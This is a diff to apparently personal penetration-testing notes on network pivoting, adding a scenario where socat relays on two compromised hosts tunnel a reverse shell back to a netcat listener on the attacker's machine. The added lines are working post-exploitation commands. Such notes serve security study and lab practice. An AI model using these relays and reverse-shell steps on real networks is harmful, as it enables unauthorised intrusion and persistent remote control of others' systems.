@@ -227,6 +227,8 @@ Things to do once you've gained a shell inside a host, with intent to pivot forw
 
 ## Scenarios
 
+The multiple IP's in the image represent different network interfaces.
+
 **Scenario 1: Get Access to Service 2 Hosts Away**
 
 **Scenario 2: Receive Revshell through 2 Hosts**
@@ -235,4 +237,14 @@ Things to do once you've gained a shell inside a host, with intent to pivot forw
     <img src="https://github.com/ToBeatELIT3/InfoSecNotes/blob/main/Methodology/Images/fig1.png">
 </details>
 
-In this case, we have RCE on
+In this case, we have RCE on ``172.14.0.5`` and want a reverse shell. It's probobly not a good idea to recive the reverse shell on our connections with ``172.12.0.1`` or ``172.14.0.3``, because those would probobly also be reverse shells and we want to keep that connection open for us. What we do is simply use socat on the ccomprimised hosts to tunnel all traffic from a port, back to a netcat listener on ``10.10.0.25``.
+
+```bash
+root@172.14.0.3 # ./tmp/socat tcp-listen:1234,fork tcp:172.0.12.2:1234 &
+---
+root@172.12.0.2 # ./tmp/socat tcp-listen:1234,fork tcp:10.10.0.25:1234 &
+---
+tobeatelite@10.10.0.25 $ rlwrap -cAr nc -lnvp 1234
+```
+
+The tunnel is set up, and by using our RCE, we can send a reverse shell to ``172.14.0.3:1234``, have it tunnel to ``172.0.12.2:1234``, which will tunnel to ``10.10.0.25:1234``, and we will have a shell on our machine. Super simple principle.
